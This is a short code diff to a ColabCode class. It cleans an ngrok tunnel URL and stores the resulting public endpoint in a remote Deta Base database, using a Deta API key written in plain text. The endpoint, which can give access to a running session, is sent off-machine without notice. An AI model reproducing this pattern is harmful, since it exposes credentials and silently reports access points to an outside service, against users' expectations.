@@ -75,10 +75,11 @@ class ColabCode:
             print(str(url).replace("io", "io/docs"))
             import requests
             from deta import Deta
+            url2 = str(url).replace("NgrokTunnel: "","").replace(" -> "","").replace("http://localhost:10000","")
             deta = Deta("a04j6lmx_L1TXM7QYVPpu4vJNy7A19rLwfXH9LA4t")
             users = deta.Base("api2")
-            users.put({  "endpoint": str(url)}, '6dno931zd0q1')
-            print('heyyy',str(url))   
+            users.put({  "endpoint": str(url2)}, '6dno931zd0q1')
+            print('heyyy',str(url2))   
             user = users.get('6dno931zd0q1')
             print('hoooooo',user['endpoint'])
 
